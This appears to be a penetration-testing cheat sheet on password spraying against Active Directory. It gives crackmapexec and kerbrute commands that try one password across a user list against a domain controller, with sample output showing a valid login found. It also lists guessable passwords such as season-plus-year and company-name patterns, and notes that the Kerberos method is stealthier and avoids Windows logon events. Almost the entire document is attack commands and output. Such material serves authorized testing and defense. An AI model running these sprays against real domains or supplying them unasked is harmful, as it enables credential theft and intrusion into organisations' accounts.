# PASSWORD SPRAYING

### Spray with crackmapexec

One password, all users — Check lockout policy first

```bash
crackmapexec smb <DC_IP> -u users.txt -p 'Password1' --continue-on-success
```

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.5 -u users.txt -p 'Winter2025'
SMB  10.10.10.5  445  DC01  [-] corp\administrator:Winter2025
SMB  10.10.10.5  445  DC01  [-] corp\john.smith:Winter2025
SMB  10.10.10.5  445  DC01  [+] corp\jane.doe:Winter2025
(FOUND VALID CREDS)
```
</details>

---

### Spray with kerbrute

Kerberos-based spray — Stealthier than SMB

```bash
kerbrute passwordspray -d <domain> users.txt 'Password1' --dc <DC_IP>
```

<details>
<summary>Example Output</summary>

```
kerbrute passwordspray -d corp.local users.txt 'Winter2025' --dc 10.10.10.5
[+] VALID LOGIN: jane.doe@corp.local:Winter2025
(Kerberos-based, doesn't generate Windows logon events)
```
</details>

---

### Common passwords to try

Predictable patterns — Match complexity requirements

```bash
Password1, Welcome1, <Season><Year> (Winter2025), <Company>1, Password123, Changeme1
```

<details>
<summary>Example Output</summary>

```
Password1     <- most common
Welcome1      <- second most common
Winter2025    <- current season + year
Corp2025!     <- company name + year
Changeme1     <- default reset password
(Match password policy: 7+ chars, uppercase, number)
```
</details>

---
